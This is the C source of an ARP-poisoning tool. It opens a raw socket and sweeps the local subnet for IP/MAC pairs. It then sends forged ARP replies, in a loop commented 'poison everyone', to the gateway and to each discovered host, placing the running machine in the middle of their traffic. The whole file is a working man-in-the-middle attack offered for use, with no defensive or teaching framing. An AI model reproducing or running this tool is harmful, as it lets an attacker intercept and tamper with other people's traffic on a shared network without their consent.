#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <err.h>
#include <pcap.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <net/if.h>
#include <netinet/if_ether.h>

#include "tools/nettools.h"

void print_usage(char *);

int main(int argc, char **argv) {
    char dev[IFNAMSIZ];
    char our_m_str[MACSLEN], target_m_str[MACSLEN], host_m_str[MACSLEN];
    char our_ip_str[IPSLEN], host_str[IPSLEN]; 
    struct ifreq ifreq_i, ifreq_c, ifreq_ip;
    uint8_t our_mac[ETH_ALEN], target_mac[ETH_ALEN], host_mac[ETH_ALEN];
    uint8_t our_ip[IP_ALEN], host_ip[IP_ALEN], target_ip[IP_ALEN];
    int sock;

    // create raw socket
    if ((sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) < 0) {
        if (getuid() != 0) {
            fprintf(stderr, "Run again as sudo! (sudo %s)\n", argv[0]);
            exit(1);
        }
        err(1, "Error : raw sock create failed");
    }

    // set defaults
    int num_packets = NPACKS;
    int sufix       = 1;

    // get optional arguments
    int op           = 0;
    int dev_from_arg = 0;
    while ((op = getopt(argc, argv, "h:n:i:")) != FAIL) {
        switch (op) {

            case 'i':
                // set interface option 
                dev_from_arg = 1;

                if (strlen(optarg) > IFNAMSIZ) {
                    fprintf(stderr, "Error : Interface name %s too long (try renaming it)\n", optarg);
                    exit(1);
                }
                strncpy(dev, optarg, IFNAMSIZ);
                dev[strlen(optarg)] = 0;
                break;

            case 'h':
                // host sufix option
                if ((sufix = atoi(optarg)) > 254) {
                    fprintf(stderr, "Error : host sufix %d too high (over 254)\n", sufix);
                    exit(1);
                }
                break;

            case 'n':
                // num-packets option
                num_packets = atoi(optarg);
                break;

            default:
                print_usage(argv[0]);
                break;
        }
    }

    // get default interface if no option set
    if (!dev_from_arg) {
        get_default_interface(dev);
    }

    // get interface info
    if(get_if_info(sock, dev, &ifreq_i, &ifreq_c, &ifreq_ip) == FAIL) {
        err(1, "Error : Failed to get info for interface %s (you probably chose the wrong one, try ifconfig or google)", dev);
    }

    // save interface info 
    memcpy(our_mac, (uint8_t *)(ifreq_c.ifr_hwaddr.sa_data), ETH_ALEN);
    mac_to_str(our_m_str, our_mac); 
    memcpy(our_ip, (void *)&(((struct sockaddr_in *)&(ifreq_ip.ifr_addr))->sin_addr), IP_ALEN);
    sprintf(our_ip_str, "%d.%d.%d.%d\n", 
            our_ip[0], 
            our_ip[1],
            our_ip[2],
            our_ip[3]); 
    
    // get/check host ip
    memcpy(host_ip, our_ip, IP_ALEN);
    host_ip[3] = sufix;
    sprintf(host_str, "%d.%d.%d.%d", 
            host_ip[0], 
            host_ip[1], 
            host_ip[2], 
            host_ip[3]);

    if (!is_valid_ip(host_str)) {
        err(1, "Error %s is not a vaild ip address", host_str);
    }

    // scan network for targets 
    struct ip_mac *ip_mac_pairs = ip_sweep(sock, ifreq_i.ifr_ifindex, our_ip, our_mac);

    // save host mac
    memset(host_mac, 0, ETH_ALEN);
    struct ip_mac *p   = ip_mac_pairs;
    struct ip_mac *prv = NULL;
    int i              = 0;

    while (1) {
        if (p->ip[3] == sufix) {
            memcpy(host_mac, p->mac, ETH_ALEN);
            mac_to_str(host_m_str, host_mac);

            // remove host from linked list
            struct ip_mac *tmp = p;
            if (prv) {
                prv->next = p->next;
            }
            else {
                ip_mac_pairs = p->next;
            }
            p = p->next;
            free(tmp);

            if (p) {
                continue;
            }
            break;
        }            
        if (p->next == NULL) {
            if (memcmp(host_mac, empty, ETH_ALEN) == 0) {
                fprintf(stderr, "Could not get host %s MAC\n", host_str);
                exit(1);
            }
            break;
        }
        printf("Found host %d: %d.%d.%d.%d\n", ++i,
                p->ip[0],
                p->ip[1],
                p->ip[2],
                p->ip[3]);
        prv = p;
        p   = p->next;
    }

    // poison everyone
    int h = 0;
    for (p = ip_mac_pairs; p != NULL; p = p->next) {
                
        memcpy(target_ip, p->ip, IP_ALEN);
        memcpy(target_mac, p->mac, ETH_ALEN);
        mac_to_str(target_m_str, target_mac);

        printf("\nTarget %d: %d.%d.%d.%d\n\n", ++h, 
                p->ip[0],
                p->ip[1],
                p->ip[2],
                p->ip[3]);

        // poison host
        printf("Poisoning host %s...\n", host_str);
        int pkts = num_packets;
        while (pkts--) {
            send_arp(sock, ifreq_i.ifr_ifindex, 
                    our_mac,      // eth source mac
                    host_mac,     // eth dest mac
                    our_mac,      // arp source mac
                    host_mac,     // arp target mac
                    target_ip,    // arp source ip
                    host_ip,      // arp target ip
                    ARPOP_REPLY); // opcode

            sleep(1);
            printf("H:(%s) ---> U:(%s) ---> T:(%s)\n",
                    host_m_str,
                    our_m_str,
                    target_m_str);
        }

        // poison target 
        printf("\nPoisoning target %d.%d.%d.%d ...\n", 
                p->ip[0],
                p->ip[1],
                p->ip[2],
                p->ip[3]);

        pkts = num_packets;
        while (pkts--) {
            send_arp(sock, ifreq_i.ifr_ifindex, 
                    our_mac,      // eth source mac
                    target_mac,   // eth dest mac
                    our_mac,      // arp source mac
                    target_mac,   // arp target mac
                    host_ip,      // arp source ip 
                    target_ip,    // arp target ip
                    ARPOP_REPLY); // opcode 

            sleep(1);
            printf("H:(%s) <--- U:(%s) <--- T:(%s)\n",
                    target_m_str,
                    our_m_str,
                    host_m_str);
        }
    }
    destroy_pairs(ip_mac_pairs);
    exit(0);
}

void print_usage(char *pname) {
    fprintf(stderr, "Usage: (sudo) %s [-i interface] [-h host-sufix (default 1)] [-n num-packets (default 20)]\n", pname);
    exit(1);
}

